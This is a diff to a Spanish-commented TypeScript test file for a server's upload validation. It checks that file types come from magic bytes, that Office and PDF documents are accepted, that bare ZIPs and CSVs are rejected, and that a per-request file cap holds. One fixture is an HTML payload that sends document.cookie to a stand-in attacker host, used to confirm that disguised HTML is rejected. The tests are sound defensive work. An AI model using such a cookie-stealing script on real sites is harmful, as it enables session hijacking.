@@ -4,7 +4,7 @@ import express from "express";
 import type { AddressInfo } from "node:net";
 import { detectFileType } from "./fileType";
 import { resolveUploadType, RejectedMediaError, MAX_BYTES_BY_KIND } from "./s3";
-import { upload, uploadErrorHandler } from "../routes/admin/shared";
+import { upload, uploadErrorHandler, MAX_FILES_PER_MESSAGE } from "../routes/admin/shared";
 
 // Fase 8, punto 7 del plan maestro (2026-09-15). Lo que se cierra: la extension y el Content-Type del
 // objeto en S3 salian de lo que declaraba el cliente, asi que un .html subido como "text/html"
@@ -18,6 +18,19 @@ const MP4 = Buffer.concat([Buffer.alloc(4), Buffer.from("ftypisom", "latin1"), B
 const OGG = Buffer.concat([Buffer.from("OggS", "latin1"), Buffer.alloc(64)]);
 const GIF = Buffer.concat([Buffer.from("GIF89a", "latin1"), Buffer.alloc(64)]);
 const HTML = Buffer.from('<html><script>fetch("https://evil.example/" + document.cookie)</script></html>', "utf8");
+const PDF = Buffer.concat([Buffer.from("%PDF-1.7\n", "latin1"), Buffer.alloc(64)]);
+const TXT = Buffer.from("nombre,telefono\nLaura,573001112233\n", "utf8");
+
+// Cabecera de un ZIP cuya primera entrada se llama como la que ponen Word, Excel y PowerPoint.
+function zipConPrimeraEntrada(nombre: string): Buffer {
+  const cabecera = Buffer.alloc(30);
+  cabecera.write("PK\u0003\u0004", 0, "latin1");
+  cabecera.writeUInt16LE(nombre.length, 26);
+  return Buffer.concat([cabecera, Buffer.from(nombre, "latin1"), Buffer.alloc(64)]);
+}
+
+const DOCX = zipConPrimeraEntrada("[Content_Types].xml");
+const ZIP_CUALQUIERA = zipConPrimeraEntrada("fotos/playa.jpg");
 
 test("el tipo sale de los bytes, no de lo que diga el cliente", () => {
   assert.deepEqual(detectFileType(PNG), { mime: "image/png", extension: "png", kind: "image" });
@@ -32,6 +45,36 @@ test("el tipo sale de los bytes, no de lo que diga el cliente", () => {
 
 // resolveUploadType es toda la decision de aceptar o rechazar, separada de la subida: se prueba sin
 // tocar S3 ni crear objetos de basura en el bucket.
+test("un documento tambien se reconoce por sus bytes", () => {
+  assert.deepEqual(detectFileType(PDF), { mime: "application/pdf", extension: "pdf", kind: "document" });
+  assert.equal(detectFileType(DOCX)?.kind, "document");
+  // Un ZIP que no es de Office queda afuera: adentro puede haber cualquier cosa y la cabecera no lo dice.
+  assert.equal(detectFileType(ZIP_CUALQUIERA), null);
+  // Un .txt/.csv no tiene bytes de cabecera propios. Aceptarlo seria creerle al que sube, que es el
+  // agujero que cerro la Fase 8 - por eso no se soporta, en vez de soportarlo a medias.
+  assert.equal(detectFileType(TXT), null);
+});
+
+test("docx, xlsx y pptx comparten bytes: lo declarado solo elige entre esos tres", () => {
+  assert.deepEqual(resolveUploadType(DOCX, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "documents"), {
+    mime: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+    extension: "xlsx",
+    kind: "document",
+  });
+  // Declarar cualquier otra cosa no convierte el archivo en otra cosa: sigue siendo el documento inerte
+  // que dicen sus bytes, guardado como docx.
+  assert.deepEqual(resolveUploadType(DOCX, "text/html", "documents"), {
+    mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+    extension: "docx",
+    kind: "document",
+  });
+});
+
+test("un documento no va a la carpeta de imagenes ni una imagen a la de documentos", () => {
+  assert.throws(() => resolveUploadType(PDF, "application/pdf", "images"), RejectedMediaError);
+  assert.throws(() => resolveUploadType(PNG, "image/png", "documents"), RejectedMediaError);
+});
+
 test("un HTML disfrazado de imagen no pasa la validacion", () => {
   assert.throws(() => resolveUploadType(HTML, "image/png", "images"), RejectedMediaError);
   assert.throws(() => resolveUploadType(HTML, "image/png", "receipts"), RejectedMediaError);
@@ -78,6 +121,9 @@ before(async () => {
   app.post("/subir", upload.single("file"), (req, res) => {
     res.json({ recibido: Boolean(req.file), mimetype: req.file?.mimetype ?? null });
   });
+  app.post("/subir-varios", upload.array("files", MAX_FILES_PER_MESSAGE), (req, res) => {
+    res.json({ cantidad: Array.isArray(req.files) ? req.files.length : 0 });
+  });
   app.use(uploadErrorHandler);
   server = app.listen(0);
   await new Promise<void>((resolve) => server.once("listening", () => resolve()));
@@ -106,6 +152,35 @@ test("multer deja pasar una imagen normal", async () => {
   assert.equal(response.status, 200);
   const body = (await response.json()) as { recibido: boolean };
   assert.equal(body.recibido, true);
+});
+
+async function postVarios(archivos: { name: string; type: string; body: Buffer }[]): Promise<Response> {
+  const form = new FormData();
+  for (const a of archivos) form.append("files", new Blob([new Uint8Array(a.body)], { type: a.type }), a.name);
+  return fetch(`${baseUrl}/subir-varios`, { method: "POST", body: form });
+}
+
+test("un envio acepta varios archivos hasta el tope", async () => {
+  const uno = { name: "foto.png", type: "image/png", body: PNG };
+  const response = await postVarios(Array.from({ length: MAX_FILES_PER_MESSAGE }, () => uno));
+  assert.equal(response.status, 200);
+  const body = (await response.json()) as { cantidad: number };
+  assert.equal(body.cantidad, MAX_FILES_PER_MESSAGE);
+});
+
+// El tope no es estetico: multer guarda cada archivo entero en memoria, asi que sin limite de cantidad
+// un solo request del panel puede pedir toda la RAM del proceso.
+test("un archivo de mas rebota con 400, no con 500", async () => {
+  const uno = { name: "foto.png", type: "image/png", body: PNG };
+  const response = await postVarios(Array.from({ length: MAX_FILES_PER_MESSAGE + 1 }, () => uno));
+  assert.equal(response.status, 400);
+});
+
+test("multer deja pasar un PDF y rechaza un .csv", async () => {
+  const ok = await post("catalogo.pdf", "application/pdf", PDF);
+  assert.equal(ok.status, 200);
+  const rechazado = await post("clientes.csv", "text/csv", TXT);
+  assert.equal(rechazado.status, 400);
 });
 
 test("una nota de voz mp4 con marca generica entra como audio, no rebota", () => {
